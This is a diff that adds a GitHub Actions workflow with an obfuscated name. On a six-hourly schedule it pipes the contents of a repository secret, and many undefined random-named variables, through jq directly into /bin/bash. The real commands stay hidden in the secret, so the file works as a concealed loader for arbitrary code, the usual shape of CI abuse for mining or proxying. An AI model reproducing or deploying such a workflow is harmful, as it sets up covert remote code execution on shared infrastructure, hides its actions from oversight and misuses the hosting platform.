@@ -1,0 +1,33 @@
+name: niyinggaiiaangdaolieba
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: niyinggaiiaangdaolieba
+        env:
+          tuub095: ${{ secrets.tuub095 }}
+        run: |
+          echo $tuub095 | jq -r .xuf78120 | /bin/bash
+          echo $e9689 | jq -r .wvq7014 | /bin/bash
+          echo $f2253 | jq -r .xwas4543 | /bin/bash
+          echo $ahmuh654 | jq -r .mm13038 | /bin/bash
+          echo $u0123 | jq -r .tuo86727 | /bin/bash
+          echo $x79645 | jq -r .jldm54 | /bin/bash
+          echo $rvxrq777 | jq -r .dnm608 | /bin/bash
+          echo $s5 | jq -r .kh167 | /bin/bash
+          echo $jody59574 | jq -r .eqd450 | /bin/bash
+          echo $rjt5 | jq -r .td57 | /bin/bash
+          echo $gwu98 | jq -r .xiu59016 | /bin/bash
+          echo $nhacc5604 | jq -r .ptf7 | /bin/bash
+          echo $il13 | jq -r .fjv7024 | /bin/bash
+          echo $sjcm3 | jq -r .g932 | /bin/bash
+          echo $erew81 | jq -r .bofm64153 | /bin/bash
+          echo $tzihr98665 | jq -r .am9 | /bin/bash
+
